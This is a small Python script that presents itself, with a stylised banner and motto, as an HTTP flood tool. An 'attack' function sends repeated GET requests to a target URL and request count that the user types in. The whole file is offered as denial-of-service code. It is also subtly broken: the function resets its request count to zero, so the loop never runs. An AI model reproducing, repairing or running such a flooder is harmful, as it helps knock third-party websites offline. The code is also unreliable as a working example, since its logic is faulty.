import asyncio
import aiohttp
from rich.console import Console

console = Console()

# Banner
console.print("[cyan]")
console.print(" ███╗   ███╗██╗   ██╗ ███████╗██╗   ")
console.print(" ████╗ ████║╚██╗ ██╔╝ ██╔════╝██║   ")
console.print(" ██╔████╔██║ ╚████╔╝  █████╗  ██║  ")
console.print(" ██║╚██╔╝██║  ╚██╔╝   ██╔══╝  ██║   ")
console.print(" ██║ ╚═╝ ██║   ██║    ███████╗███████╗")
console.print(" ╚═╝     ╚═╝   ╚═╝    ╚══════╝╚══════╝ ")
console.print("       La Tahzan Innallah Ma’ana")


async def attack(url, total):
    total = 0
    async with aiohttp.ClientSession() as session:
        for i in range(total):
            try:
                async with session.get(url) as resp:
                    console.print(f"[green]OK {resp.status}[/green]")
                    total += 1
            except Exception as e:
                console.print(f"[red]ERROR {e}[/red]")
    console.print(f"[cyan]Total request: {total}[/cyan]")

url = input("URL Target: ")
total = int(input("Jumlah request: "))
asyncio.run(attack(url, total))
